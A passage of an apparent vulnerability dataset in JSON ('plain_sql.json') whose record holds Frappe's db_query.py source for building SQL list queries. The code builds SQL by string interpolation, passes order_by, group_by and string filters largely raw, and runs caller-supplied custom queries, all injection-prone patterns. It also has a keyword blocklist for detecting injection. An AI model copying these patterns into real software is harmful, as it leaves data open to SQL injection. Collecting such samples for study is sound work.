condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = \"'%s' AND '%s'\" % (\n\t\tget_datetime(from_date).strftime(date_format),\n\t\tget_datetime(to_date).strftime(date_format))\n\n\treturn data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/vhrspvl/hd-frappe/blob/e4d83fbc97f01a693c9f89969c49dc0e5c4fb1ba",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\n\t\tsub_query_regex = re.compile(\"^.*[,();].*\")\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',\n\t\t\t'from', 'group', 'order', 'by']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)\n\n\t\tdef _is_query(field):\n\t\t\tif re.compile(\"^(select|delete|update|drop|create)\\s\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\telif re.compile(\"\\s*[a-zA-z]*\\s*( from | group by | order by | where | join )\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\tfor field in self.fields:\n\t\t\tif sub_query_regex.match(field):\n\t\t\t\tif any(keyword in field.lower().split() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"({0}\".format(keyword) in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() for keyword in blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile(\"[a-zA-Z]+\\s*'\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile('[a-zA-Z]+\\s*,').match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\t_is_query(field)\n\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 